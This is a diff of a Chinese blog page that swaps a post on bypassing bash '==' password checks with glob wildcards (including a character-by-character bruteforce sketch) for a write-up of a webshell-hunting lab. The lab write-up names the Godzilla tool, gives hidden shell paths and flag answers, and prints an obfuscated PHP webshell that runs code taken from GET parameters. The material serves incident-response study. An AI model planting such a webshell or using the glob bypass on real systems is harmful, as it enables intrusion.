@@ -9,7 +9,7 @@
     
     <title>
         
-            sh脚本中==判断的几个情况 |
+            玄机--webshell查杀 |
         
         Flowww&#39;s blog
     </title>
@@ -191,7 +191,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        sh脚本中==判断的几个情况
+                        玄机--webshell查杀
                     </div>
                 
 
@@ -217,12 +217,12 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2024-04-23</span>
+                <span class="datetime">2024-05-31</span>
             </span>
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Tue Apr 23 2024 22:01:36 GMT+0800">2024-04-23</span>
+                <span class="datetime" data-updated="Fri May 31 2024 23:40:09 GMT+0800">2024-05-31</span>
             </span>
         
 
@@ -232,7 +232,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></li>
                         
                     
                 </ul>
@@ -260,39 +260,27 @@
                 <div class="post-content keep-markdown-body">
                     
 
-                    <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到一个脚本需要爆破密码，我在已知密码是18位的情况下，妄想写个脚本去爆破，肯定是失败的，最后看到正确的脚本，我注意到里面用到*，最开始的理解是通配符绕过去了，经过shell脚本大佬·群主老师·云淡__风轻的点拨，我了解到一个关于shell脚本的知识点，有必要写个笔记记录一下。</p>
-<h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h5><p>先看脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+                    <h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>护网要来了，好久没写博客了（滑跪）。前段时间朋友给了个号，做一波记录一下，一些语句和工具很值得学习。</p>
+<h4 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>先把html文件夹下的源码下载到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>
 
-<p>逻辑就是定义一个password，然后我们的输入保存在input里，比较input和password看看o不ok</p>
-<p>正常情况下我们要ok就应该输入‘qwe123’，和password去匹配</p>
-<p>但是我们可以用到*, *在shell里叫glob，也叫通配符， *的作用可以用来匹配任何长度的任何字符，类似于正则里面的 *，</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
-<p>后来了解到glob有其他字符，各自有不同的功能，比如?可以匹配任意字符串，在我知道密码长度的情况下输入n个?，也能绕过</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
-<h5 id="没法用的情况1"><a href="#没法用的情况1" class="headerlink" title="*没法用的情况1"></a>*没法用的情况1</h5><p>如果脚本长这样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<p>然后用d盾查杀一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
+<p>查看gz.php，看到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>注意到$input前后多了引号</strong>，这个时候再使用*去通配就会失败</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
-<p><strong>原因是：给$input前后加上引号，会导致*没办法展开，所以通配不了，这个时候只能输入和password一模一样的字符才能ok</strong></p>
-<h5 id="没法用的情况2"><a href="#没法用的情况2" class="headerlink" title="*没法用的情况2"></a>*没法用的情况2</h5><p>这个时候的脚本长这样</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+<h4 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h4><p>gz.php看的出来用的是哥斯拉的木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>
 
-<p>对比第一个脚本，在判断里面$input $password的位置调换了</p>
-<p>这个东西有点抽象，群主当时给了例子</p>
-<p>我自己复现了一下</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
-<p>接下来理解一下：*.txt能够代表很多个txt文件，他不能只等于1.txt，所以no，但是1.txt是 *.txt里面的一个，所以可以ok</p>
-<p><strong>通俗地讲就是多个文件不能等于特定的那一个，特定的一个文件属于多个文件里</strong></p>
-<p>回到input那里，我们给他输入*，就符合多个可能对应特定的一个，所以不能，所以not ok</p>
-<h4 id="绕过的应用"><a href="#绕过的应用" class="headerlink" title="*绕过的应用"></a>*绕过的应用</h4><p>了解到三个用法，有这个思路就可以用来爆破密码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># 创建包含所有字母和数字的字符列表</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化密码为空字符串</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># 初始化 found 变量为 False，表示密码尚未找到</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;｜对应的脚本操作</span></span><br><span class="line"><span class="string">        ...后续的判断</span></span><br></pre></td></tr></table></figure>
+<h4 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>D盾看到有一个.Mysqli.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>
 
-<p>command &#x3D; f”echo ‘{password}{character}*’注意这里最后就是有一个 *去通配，然后一位一位地去爆破密码</p>
-<p>肯定不止这个用法，后续待更新</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>肯定是要感谢群主的耐心指导</p>
-<p>这个知识点现在理解了就觉得没什么，不过还是值得记录下来的</p>
+<h4 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h4><p>d盾看到有一个top.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>
+
+<p>明显有混淆和编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">路径：/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>
+
 
                 </div>
                 
@@ -303,7 +291,7 @@
                             <ul class="post-tags-box border-box">
                                 
                                     <li class="tag-item border-box">
-                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
                                     </li>
                                 
                             </ul>
@@ -322,14 +310,14 @@
                             <div class="prev-post">
                                 <a class="prev"
                                    rel="prev"
-                                   href="/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/"
-                                   title="玄机--webshell查杀"
+                                   href="/2024/05/31/%E7%8E%84%E6%9C%BA-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"
+                                   title="玄机--日志分析"
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">玄机--webshell查杀</span>
+                                        <span class="post-nav-title-item text-ellipsis">玄机--日志分析</span>
                                         <span class="post-nav-item">上一篇</span>
                                     </span>
                                 </a>
@@ -339,11 +327,11 @@
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2024/04/10/htb-driver%E5%A4%8D%E7%9B%98/"
-                                   title="htb driver复盘"
+                                   href="/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/"
+                                   title="sh脚本中==判断的几个情况"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">htb driver复盘</span>
+                                        <span class="post-nav-title-item text-ellipsis">sh脚本中==判断的几个情况</span>
                                         <span class="post-nav-item">下一篇</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -371,7 +359,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E6%AD%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">进入正题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">&#x3D;&#x3D;绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B51"><span class="nav-number">2.2.</span> <span class="nav-text">*没法用的情况1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B52"><span class="nav-number">2.3.</span> <span class="nav-text">*没法用的情况2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">*绕过的应用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><span class="nav-number">2.</span> <span class="nav-text">黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell-github%E5%9C%B0%E5%9D%80%E7%9A%84md5-flag-md5"><span class="nav-number">3.</span> <span class="nav-text">黑客使用的什么工具的shell github地址的md5 flag{md5}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%E7%9A%84md5-flag-md5-%E6%B3%A8-xxx-xxx-xxx-xxx-xxx-xxx"><span class="nav-number">4.</span> <span class="nav-text">黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flag-md5"><span class="nav-number">5.</span> <span class="nav-text">黑客免杀马完整路径 md5 flag{md5}</span></a></li></ol>
     </div>
 </div>
 
@@ -534,7 +522,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%85%A5%E6%AD%A3%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">进入正题</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">&#x3D;&#x3D;绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B51"><span class="nav-number">2.2.</span> <span class="nav-text">*没法用的情况1</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B2%A1%E6%B3%95%E7%94%A8%E7%9A%84%E6%83%85%E5%86%B52"><span class="nav-number">2.3.</span> <span class="nav-text">*没法用的情况2</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E7%9A%84%E5%BA%94%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">*绕过的应用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2webshell%E9%87%8C%E9%9D%A2%E7%9A%84flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><span class="nav-number">2.</span> <span class="nav-text">黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E7%9A%84shell-github%E5%9C%B0%E5%9D%80%E7%9A%84md5-flag-md5"><span class="nav-number">3.</span> <span class="nav-text">黑客使用的什么工具的shell github地址的md5 flag{md5}</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E9%9A%90%E8%97%8Fshell%E7%9A%84%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84%E7%9A%84md5-flag-md5-%E6%B3%A8-xxx-xxx-xxx-xxx-xxx-xxx"><span class="nav-number">4.</span> <span class="nav-text">黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E5%85%8D%E6%9D%80%E9%A9%AC%E5%AE%8C%E6%95%B4%E8%B7%AF%E5%BE%84-md5-flag-md5"><span class="nav-number">5.</span> <span class="nav-text">黑客免杀马完整路径 md5 flag{md5}</span></a></li></ol>
     </div>
 </div>
 
